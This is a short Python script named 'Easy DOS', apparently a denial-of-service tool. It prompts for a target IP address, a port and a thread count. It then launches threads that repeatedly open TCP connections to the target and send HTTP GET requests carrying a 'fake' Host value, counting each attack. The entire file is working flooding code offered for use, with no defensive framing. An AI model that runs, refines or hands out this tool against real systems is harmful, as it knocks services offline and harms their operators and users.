import os
import socket
import threading

# Clear terminal and display tool name using figlet
os.system("clear")
os.system("figlet Easy DOS")

# User input for target, port, and number of threads
target = str(input("Enter Target's IP Address: "))
port = int(input("Enter port number: "))
Trd = int(input("Enter number of threads: "))
fake_ip_add = '203.0.113.45'

# Global variable to track attack count
attack_count = 0
running = True  # Add a flag to control running threads

def attack():
    global attack_count
    while running:  # Only run the attack while 'running' is True
        try:
            # Create a socket and connect to the target
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))

            # Send HTTP GET request with fake IP
            s.sendto((f"GET / HTTP/1.1\r\nHost: {fake_ip_add}\r\n\r\n").encode('ascii'), (target, port))
            s.close()

            # Increment attack count and print it
            attack_count += 1
            print(f"Attack number: {attack_count}")

        except Exception as e:
            print(f"Error: {e}")
            s.close()

 
try:
    for i in range(Trd):
        thread = threading.Thread(target=attack)
        thread.start()

except KeyboardInterrupt:
    # Handle Ctrl+C gracefully
    print("\n[!] Attack stopped by user. Cleaning up...")
    running = False   

 
